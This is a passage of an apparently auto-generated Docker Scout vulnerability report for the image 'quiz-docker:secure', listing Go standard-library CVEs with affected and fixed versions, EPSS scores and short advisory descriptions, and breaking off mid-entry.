<h2>:mag: Vulnerabilities of <code>quiz-docker:secure</code></h2>

<details open="true"><summary>:package: Image Reference</strong> <code>quiz-docker:secure</code></summary>
<table>
<tr><td>digest</td><td><code>sha256:17bd0ca35790769c2efc3085a28e369b414127cbbacf9c26ef4dcde072afda1f</code></td><tr><tr><td>vulnerabilities</td><td><img alt="critical: 6" src="https://img.shields.io/badge/critical-6-8b1924"/> <img alt="high: 63" src="https://img.shields.io/badge/high-63-e25d68"/> <img alt="medium: 80" src="https://img.shields.io/badge/medium-80-fbb552"/> <img alt="low: 47" src="https://img.shields.io/badge/low-47-fce1a9"/> <img alt="unspecified: 2" src="https://img.shields.io/badge/unspecified-2-lightgrey"/></td></tr>
<tr><td>platform</td><td>linux/amd64</td></tr>
<tr><td>size</td><td>88 MB</td></tr>
<tr><td>packages</td><td>356</td></tr>
</table>
</details></table>
</details>

<table>
<tr><td valign="top">
<details><summary><img alt="critical: 6" src="https://img.shields.io/badge/C-6-8b1924"/> <img alt="high: 39" src="https://img.shields.io/badge/H-39-e25d68"/> <img alt="medium: 41" src="https://img.shields.io/badge/M-41-fbb552"/> <img alt="low: 2" src="https://img.shields.io/badge/L-2-fce1a9"/> <img alt="unspecified: 1" src="https://img.shields.io/badge/U-1-lightgrey"/><strong>stdlib</strong> <code>1.20.7</code> (golang)</summary>

<small><code>pkg:golang/stdlib@1.20.7</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-68121?s=golang&n=stdlib&t=golang&vr=%3C1.24.13"><img alt="critical : CVE--2025--68121" src="https://img.shields.io/badge/CVE--2025--68121-lightgrey?label=critical%20&labelColor=8b1924"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.24.13</code></td></tr>
<tr><td>Fixed version</td><td><code>1.24.13</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.902%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>60th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

During session resumption in crypto/tls, if the underlying Config has its ClientCAs or RootCAs fields mutated between the initial handshake and the resumed handshake, the resumed handshake may succeed when it should have failed. This may happen when a user calls Config.Clone and mutates the returned Config, or uses Config.GetConfigForClient. This can cause a client to resume a session with a server that it would not have resumed with during the initial handshake, or cause a server to resume a session with a client that it would not have resumed with during the initial handshake.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-56857?s=golang&n=stdlib&t=golang&vr=%3C1.26.9"><img alt="critical : CVE--2026--56857" src="https://img.shields.io/badge/CVE--2026--56857-lightgrey?label=critical%20&labelColor=8b1924"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.26.9</code></td></tr>
<tr><td>Fixed version</td><td><code>1.26.9</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.553%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>47th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

On Windows, when the target of Root.Mkdir or Root.MkdirAll is a junction pointing to an empty location, the operation can create a directory at the junction target even when that target is located outside the root. This only applies to operations where the last path component is a junction (path/to/junction, but not path/junction/target).

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-24790?s=golang&n=stdlib&t=golang&vr=%3C1.21.11"><img alt="critical : CVE--2024--24790" src="https://img.shields.io/badge/CVE--2024--24790-lightgrey?label=critical%20&labelColor=8b1924"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.21.11</code></td></tr>
<tr><td>Fixed version</td><td><code>1.21.11</code></td></tr>
<tr><td>EPSS Score</td><td><code>1.952%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>81st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The various Is methods (IsPrivate, IsLoopback, etc) did not work as expected for IPv4-mapped IPv6 addresses, returning false for addresses which would return true in their traditional IPv4 forms.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-39821?s=golang&n=stdlib&t=golang&vr=%3C1.25.13"><img alt="critical : CVE--2026--39821" src="https://img.shields.io/badge/CVE--2026--39821-lightgrey?label=critical%20&labelColor=8b1924"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.25.13</code></td></tr>
<tr><td>Fixed version</td><td><code>1.25.13</code></td></tr>
<tr><td>EPSS Score</td><td><code>1.834%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>79th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The ToASCII and ToUnicode functions incorrectly accept Punycode-encoded labels that decode to an ASCII-only label. For example, ToUnicode("xn--example-.com") incorrectly returns the name "example.com" rather than an error.

This behavior can lead to privilege escalation in programs using the idna package. For example, a program which performs privilege checks on the ASCII hostname may reject "example.com" but permit "xn--example-.com". If that program subsequently converts the ASCII hostname to Unicode, it will inadvertently permits access to the Unicode name "example.com".

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-78663?s=golang&n=stdlib&t=golang&vr=%3C1.26.9"><img alt="critical : CVE--2026--78663" src="https://img.shields.io/badge/CVE--2026--78663-lightgrey?label=critical%20&labelColor=8b1924"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.26.9</code></td></tr>
<tr><td>Fixed version</td><td><code>1.26.9</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.858%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>59th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The HTTP/2 server can refund connection-level flow control twice for the same data: Once when a client resets a stream (refunding data for any sent-but-unread portion of the stream), and again when a request handler reads the buffered data. A malicious client can exploit this to bypass the configured connection-level flow control limit (MaxReceiveBufferPerConnection). Total buffered data is still limited by the concurrent stream limit and stream-level flow control.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-22871?s=golang&n=stdlib&t=golang&vr=%3C1.23.8"><img alt="critical : CVE--2025--22871" src="https://img.shields.io/badge/CVE--2025--22871-lightgrey?label=critical%20&labelColor=8b1924"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.23.8</code></td></tr>
<tr><td>Fixed version</td><td><code>1.23.8</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.842%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>58th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The net/http package improperly accepts a bare LF as a line terminator in chunked data chunk-size lines. This can permit request smuggling if a net/http server is used in conjunction with a server that incorrectly accepts a bare LF as part of a chunk-ext.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-39822?s=golang&n=stdlib&t=golang&vr=%3C1.25.12"><img alt="high : CVE--2026--39822" src="https://img.shields.io/badge/CVE--2026--39822-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.25.12</code></td></tr>
<tr><td>Fixed version</td><td><code>1.25.12</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.232%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>14th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

On Unix systems, opening a file in an os.Root improperly follows symlinks to locations outside of the Root when the final path component of the a path is a symbolic link and the path ends in /.

For example, 'root.Open("symlink/")' will open "symlink" even when "symlink" is a symbolic link pointing outside of the root.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-97032?s=golang&n=stdlib&t=golang&vr=%3C1.26.9"><img alt="high : CVE--2026--97032" src="https://img.shields.io/badge/CVE--2026--97032-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.26.9</code></td></tr>
<tr><td>Fixed version</td><td><code>1.26.9</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.676%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>53rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

HTTP/2 servers could end up crashing due to inadvertently modifying its HPACK encoder concurrently. This happens because the server modifies the HPACK encoder from two goroutines without synchronization: one uses the encoder to encode a HEADERS frame as part of a response sent to a client and the other modifies the encoder's table size when handling a SETTINGS frame containing SETTINGS_HEADER_TABLE_SIZE that a client sends. A malicious client can repeatedly send a request while changing the header table size to crash the server.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-97031?s=golang&n=stdlib&t=golang&vr=%3C1.26.9"><img alt="high : CVE--2026--97031" src="https://img.shields.io/badge/CVE--2026--97031-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.26.9</code></td></tr>
<tr><td>Fixed version</td><td><code>1.26.9</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.716%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>54th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Multiple ECH outer extension references are not permitted under RFC 9849; previously, a client could send a well-crafted packet that could trigger memory exhaustion in the server process by specifying multiple references.

We now reject these as malformed and curb the memory amplification vector as a result.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-94440?s=golang&n=stdlib&t=golang&vr=%3C1.26.9"><img alt="high : CVE--2026--94440" src="https://img.shields.io/badge/CVE--2026--94440-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.26.9</code></td></tr>
<tr><td>Fixed version</td><td><code>1.26.9</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.706%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>54th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Parsing a multipart form can bypass memory limits and read an arbitrarily long line into memory when the remaining limit at the start of a part is less than 400 bytes.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-94439?s=golang&n=stdlib&t=golang&vr=%3C1.26.9"><img alt="high : CVE--2026--94439" src="https://img.shields.io/badge/CVE--2026--94439-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.26.9</code></td></tr>
<tr><td>Fixed version</td><td><code>1.26.9</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.528%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>45th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

When an HTTP server handler sends a 2xx response to an HTTP/1 CONNECT request and returns without hijacking the connection, the server improperly continues to read and serve requests from the connection. Since a 2xx response to an HTTP/1 CONNECT converts the connection into a tunnel, the server should not treat the connection as continuing to contain HTTP.

The impact of this misbehavior is mostly limited to potential request smuggling, where an intermediate proxy considers the data on the connection to be tunneled and the server considers it to be HTTP.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-78669?s=golang&n=stdlib&t=golang&vr=%3C1.26.9"><img alt="high : CVE--2026--78669" src="https://img.shields.io/badge/CVE--2026--78669-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.26.9</code></td></tr>
<tr><td>Fixed version</td><td><code>1.26.9</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.847%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>59th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A malicious HTTP/2 peer can cause excessive CPU consumption in the client or server by opening a large number of streams and then sending many small SETTINGS frames containing SETTINGS_INITIAL_WINDOW_SIZE values.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-78667?s=golang&n=stdlib&t=golang&vr=%3C1.26.9"><img alt="high : CVE--2026--78667" src="https://img.shields.io/badge/CVE--2026--78667-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.26.9</code></td></tr>
<tr><td>Fixed version</td><td><code>1.26.9</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.663%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>52nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

When parsing a Range header containing a large number of small ranges, FileServer(FS), ServeContent, and ServeFile(FS) can consume an excessive amount of CPU.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-78660?s=golang&n=stdlib&t=golang&vr=%3C1.26.9"><img alt="high : CVE--2026--78660" src="https://img.shields.io/badge/CVE--2026--78660-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.26.9</code></td></tr>
<tr><td>Fixed version</td><td><code>1.26.9</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.542%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>46th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Historically, we have been rather lax about malformed framing-related headers in our HTTP/2 implementation, as they cannot interfere with HTTP/2 framing. However, this makes it possible for our HTTP/2 implementation to forward responses containing such headers to an HTTP/1 client when acting as a reverse proxy. If the HTTP/1 client also does not behave strictly enough, this can result in response smuggling.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-78659?s=golang&n=stdlib&t=golang&vr=%3C1.26.9"><img alt="high : CVE--2026--78659" src="https://img.shields.io/badge/CVE--2026--78659-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.26.9</code></td></tr>
<tr><td>Fixed version</td><td><code>1.26.9</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.866%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>59th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

When "Trailer" headers are sent by a client, the HTTP server internally uses the header values to populate the Request.Trailer map passed to the server handler. Because Request.Trailer is a map, each entry incurs memory overhead. For HTTP/2 servers, a malicious client can exploit this by sending a "Trailer" header that declares a large number of fields, causing the server to allocate a disproportionate amount of memory while bypassing Server.MaxHeaderValueCount and Server.MaxHeaderBytes limits. This exploit is not applicable for HTTP/1 servers, which do not support multiplexing a large number of requests over one TCP connection, and whose Server.MaxHeaderBytes are calculated differently.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-56866?s=golang&n=stdlib&t=golang&vr=%3C1.26.9"><img alt="high : CVE--2026--56866" src="https://img.shields.io/badge/CVE--2026--56866-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.26.9</code></td></tr>
<tr><td>Fixed version</td><td><code>1.26.9</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.604%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>49th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

When http.Transport sends an HTTP/1 CONNECT request with a non-empty Request.Body, it writes the body directly to the connection without framing after the request headers. If the server rejects the CONNECT request with a non-2xx keep-alive response, Transport returns the connection to the idle pool. Because CONNECT requests do not have a request body, the server may interpret the trailing body bytes as a subsequent pipelined HTTP/1.1 request on the connection, leaving the pooled connection desynchronized and causing the next caller that reuses it to read the response to the injected request. In reverse proxies (including httputil.ReverseProxy) that forward CONNECT requests through a shared Transport, this can lead to cross-user response poisoning.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-56862?s=golang&n=stdlib&t=golang&vr=%3C1.25.13"><img alt="high : CVE--2026--56862" src="https://img.shields.io/badge/CVE--2026--56862-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.25.13</code></td></tr>
<tr><td>Fixed version</td><td><code>1.25.13</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.568%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>48th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Handshake messages, such as KeyUpdate, are always considered as state-advancing, regardless of whether a handshake has been completed or not. As a result, a malicious client can keep sending KeyUpdate messages to force the server to keep performing key derivation operations indefinitely.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-56859?s=golang&n=stdlib&t=golang&vr=%3C1.25.13"><img alt="high : CVE--2026--56859" src="https://img.shields.io/badge/CVE--2026--56859-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.25.13</code></td></tr>
<tr><td>Fixed version</td><td><code>1.25.13</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.568%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>48th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Previously, DecodeElement would reset the depth counter causing it to never fire; this could lead to stack exhaustion.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-56853?s=golang&n=stdlib&t=golang&vr=%3C1.25.13"><img alt="high : CVE--2026--56853" src="https://img.shields.io/badge/CVE--2026--56853-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.25.13</code></td></tr>
<tr><td>Fixed version</td><td><code>1.25.13</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.568%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>48th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

When a server is configured to support unencrypted HTTP/2, it reads a few bytes from each new connection to see if they contain the HTTP/2 client preface. ReadHeaderTimeout is unexpectedly not being applied when doing this.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-42504?s=golang&n=stdlib&t=golang&vr=%3C1.25.11"><img alt="high : CVE--2026--42504" src="https://img.shields.io/badge/CVE--2026--42504-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.25.11</code></td></tr>
<tr><td>Fixed version</td><td><code>1.25.11</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.560%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>47th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Decoding a maliciously-crafted MIME header containing many invalid encoded-words can consume excessive CPU.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-42499?s=golang&n=stdlib&t=golang&vr=%3C1.25.10"><img alt="high : CVE--2026--42499" src="https://img.shields.io/badge/CVE--2026--42499-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.25.10</code></td></tr>
<tr><td>Fixed version</td><td><code>1.25.10</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.798%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>57th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Pathological inputs could cause DoS through consumePhrase when parsing an email address according to RFC 5322.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-39836?s=golang&n=stdlib&t=golang&vr=%3C1.25.10"><img alt="high : CVE--2026--39836" src="https://img.shields.io/badge/CVE--2026--39836-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.25.10</code></td></tr>
<tr><td>Fixed version</td><td><code>1.25.10</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.633%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>51st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The Dial and LookupPort functions panic on Windows when provided with an input containing a NUL (0).

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-39820?s=golang&n=stdlib&t=golang&vr=%3C1.25.10"><img alt="high : CVE--2026--39820" src="https://img.shields.io/badge/CVE--2026--39820-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.25.10</code></td></tr>
<tr><td>Fixed version</td><td><code>1.25.10</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.784%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>57th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Well-crafted inputs reaching ParseAddress, ParseAddressList, and ParseDate were able to trigger excessive CPU exhaustion and memory allocations.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-33818?s=golang&n=stdlib&t=golang&vr=%3C1.25.13"><img alt="high : CVE--2026--33818" src="https://img.shields.io/badge/CVE--2026--33818-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.25.13</code></td></tr>
<tr><td>Fixed version</td><td><code>1.25.13</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.568%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>48th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Enforce a recursion limit in Unmarshal to prevent stack exhaustion when parsing deeply-nested, recursive structures.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-33814?s=golang&n=stdlib&t=golang&vr=%3C1.25.10"><img alt="high : CVE--2026--33814" src="https://img.shields.io/badge/CVE--2026--33814-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.25.10</code></td></tr>
<tr><td>Fixed version</td><td><code>1.25.10</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.840%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>58th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

When processing HTTP/2 SETTINGS frames, transport will enter an infinite loop of writing CONTINUATION frames if it receives a SETTINGS_MAX_FRAME_SIZE with a value of 0.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-33811?s=golang&n=stdlib&t=golang&vr=%3C1.25.10"><img alt="high : CVE--2026--33811" src="https://img.shields.io/badge/CVE--2026--33811-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.25.10</code></td></tr>
<tr><td>Fixed version</td><td><code>1.25.10</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.875%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>60th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

When using LookupCNAME with the cgo DNS resolver, a very long CNAME response can trigger a double-free of C memory and a crash.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-32283?s=golang&n=stdlib&t=golang&vr=%3C1.25.9"><img alt="high : CVE--2026--32283" src="https://img.shields.io/badge/CVE--2026--32283-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.25.9</code></td></tr>
<tr><td>Fixed version</td><td><code>1.25.9</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.632%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>51st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

If one side of the TLS connection sends multiple key update messages post-handshake in a single record, the connection can deadlock, causing uncontrolled consumption of resources. This can lead to a denial of service.

This only affects TLS 1.3.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-32281?s=golang&n=stdlib&t=golang&vr=%3C1.25.9"><img alt="high : CVE--2026--32281" src="https://img.shields.io/badge/CVE--2026--32281-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.25.9</code></td></tr>
<tr><td>Fixed version</td><td><code>1.25.9</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.361%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>30th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Validating certificate chains which use policies is unexpectedly inefficient when certificates in the chain contain a very large number of policy mappings, possibly causing denial of service.

This only affects validation of otherwise trusted certificate chains, issued by a root CA in the VerifyOptions.Roots CertPool, or in the system certificate pool.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-32280?s=golang&n=stdlib&t=golang&vr=%3C1.25.9"><img alt="high : CVE--2026--32280" src="https://img.shields.io/badge/CVE--2026--32280-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.25.9</code></td></tr>
<tr><td>Fixed version</td><td><code>1.25.9</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.626%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>51st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

During chain building, the amount of work that is done is not correctly limited when a large number of intermediate certificates are passed in VerifyOptions.Intermediates, which can lead to a denial of service. This affects both direct users of crypto/x509 and users of crypto/tls.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-25679?s=golang&n=stdlib&t=golang&vr=%3C1.25.8"><img alt="high : CVE--2026--25679" src="https://img.shields.io/badge/CVE--2026--25679-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.25.8</code></td></tr>
<tr><td>Fixed version</td><td><code>1.25.8</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.827%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>58th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

url.Parse insufficiently validated the host/authority component and accepted some invalid URLs.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-61729?s=golang&n=stdlib&t=golang&vr=%3C1.24.11"><img alt="high : CVE--2025--61729" src="https://img.shields.io/badge/CVE--2025--61729-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.24.11</code></td></tr>
<tr><td>Fixed version</td><td><code>1.24.11</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.490%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>43rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Within HostnameError.Error(), when constructing an error string, there is no limit to the number of hosts that will be printed out. Furthermore, the error string is constructed by repeated string concatenation, leading to quadratic runtime. Therefore, a certificate provided by a malicious actor can result in excessive resource consumption.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-61726?s=golang&n=stdlib&t=golang&vr=%3C1.24.12"><img alt="high : CVE--2025--61726" src="https://img.shields.io/badge/CVE--2025--61726-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.24.12</code></td></tr>
<tr><td>Fixed version</td><td><code>1.24.12</code></td></tr>
<tr><td>EPSS Score</td><td><code>2.292%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>84th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The net/url package does not set a limit on the number of query parameters in a query.

While the maximum size of query parameters in URLs is generally limited by the maximum request header size, the net/http.Request.ParseForm method can parse large URL-encoded forms. Parsing a large form containing many unique query parameters can cause excessive memory consumption.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-61725?s=golang&n=stdlib&t=golang&vr=%3C1.24.8"><img alt="high : CVE--2025--61725" src="https://img.shields.io/badge/CVE--2025--61725-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.24.8</code></td></tr>
<tr><td>Fixed version</td><td><code>1.24.8</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.647%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>52nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The ParseAddress function constructs domain-literal address components through repeated string concatenation. When parsing large domain-literal components, this can cause excessive CPU consumption.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-61723?s=golang&n=stdlib&t=golang&vr=%3C1.24.8"><img alt="high : CVE--2025--61723" src="https://img.shields.io/badge/CVE--2025--61723-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.24.8</code></td></tr>
<tr><td>Fixed version</td><td><code>1.24.8</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.661%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>52nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The processing time for parsing some invalid inputs scales non-linearly with respect to the size of the input.

This affects programs which parse untrusted PEM inputs.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-58188?s=golang&n=stdlib&t=golang&vr=%3C1.24.8"><img alt="high : CVE--2025--58188" src="https://img.shields.io/badge/CVE--2025--58188-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.24.8</code></td></tr>
<tr><td>Fixed version</td><td><code>1.24.8</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.381%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>33rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Validating certificate chains which contain DSA public keys can cause programs to panic, due to a interface cast that assumes they implement the Equal method.

This affects programs which validate arbitrary certificate chains.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-58187?s=golang&n=stdlib&t=golang&vr=%3C1.24.9"><img alt="high : CVE--2025--58187" src="https://img.shields.io/badge/CVE--2025--58187-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.24.9</code></td></tr>
<tr><td>Fixed version</td><td><code>1.24.9</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.406%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>35th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Due to the design of the name constraint checking algorithm, the processing time of some inputs scale non-linearly with respect to the size of the certificate.

This affects programs which validate arbitrary certificate chains.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-34158?s=golang&n=stdlib&t=golang&vr=%3C1.22.7"><img alt="high : CVE--2024--34158" src="https://img.shields.io/badge/CVE--2024--34158-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.22.7</code></td></tr>
<tr><td>Fixed version</td><td><code>1.22.7</code></td></tr>
<tr><td>EPSS Score</td><td><code>1.046%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>65th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

